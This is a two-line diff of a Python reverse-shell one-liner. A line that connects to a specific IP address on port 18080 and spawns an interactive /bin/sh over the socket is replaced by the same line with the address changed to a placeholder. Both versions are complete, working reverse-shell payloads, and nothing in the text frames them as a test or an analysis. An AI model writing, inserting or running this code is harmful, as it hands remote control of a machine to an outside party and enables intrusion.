@@ -1,2 +1,2 @@
 import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("66.42.103.10",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
